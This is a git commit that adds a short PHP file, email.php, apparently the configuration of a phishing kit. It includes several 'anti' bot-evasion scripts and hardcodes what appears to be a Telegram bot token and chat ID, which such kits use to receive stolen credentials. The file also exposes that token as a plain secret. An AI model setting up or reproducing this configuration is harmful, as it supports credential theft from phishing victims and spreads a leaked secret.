03d07eafabc77098a2a61903ff789055fc57417e
super24hsupport <147341234+super24hsupport@users.noreply.github.com>
2023-10-09 00:24:27 +0200

    Add files via upload

---
+++ email.php
@@ -0,0 +1,11 @@
+<?php
+include "anti/anti1.php";
+include "anti/anti2.php"; 
+include "anti/anti3.php"; 
+include "anti/anti4.php"; 
+include "anti/anti5.php"; 
+include "anti/anti7.php"; 
+$api = "6384022624:AAE_iCiMfiBVgU6IDExAUj0AEBAjknvaCuw";
+$chatid = "5008331146";
+$email ="your email";
+?>
